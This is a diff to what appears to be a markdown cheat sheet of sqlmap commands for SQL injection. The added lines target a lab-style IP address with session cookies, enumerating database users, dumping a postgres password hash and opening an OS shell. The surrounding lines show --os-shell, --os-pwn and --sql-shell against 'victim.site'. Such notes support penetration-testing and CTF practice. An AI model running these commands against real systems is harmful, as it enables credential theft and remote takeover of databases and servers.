@@ -61,7 +61,6 @@ sqlmap -r nameoffiletoinject -p vuln-param -os-shell
 sqlmap -r nameoffiletoinject -p vuln-param -os-pwn 
 ```
 
-
 ## Using URL
 
 You can also provide the url with --url or -u
@@ -71,6 +70,17 @@ sqlmap --url ‘http://victim.site’  --dbs --batch //
 sqlmap --url ‘http://victim.site’  --users // gets users
 sqlmap --url ‘http://victim.site’  --tables // gets all tables
 sqlmap --url ‘http://victim.site’  --batch //
+
+
+# Check what users we have and which privileges that user has.
+sqlmap -u $IP/path.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --users
+
+# Dump the password hash for an user (postgres in the example) and exploit that super permission.
+sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=e14ch3u8gfbq8u3h97t8bqss9o" -U postgres --password --batch
+
+# Get a shell 
+sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=e14ch3u8gfbq8u3h97t8bqss9o" --batch --os-shell                  
+
 ```
 
 ## Getting a direct SQL Shell
@@ -81,6 +91,4 @@ sqlmap --url ‘http://victim.site’  --os-shell
 
 # GEt a SQL shell
 sqlmap --url ‘http://victim.site’  --sql-shell
-
-
 ```
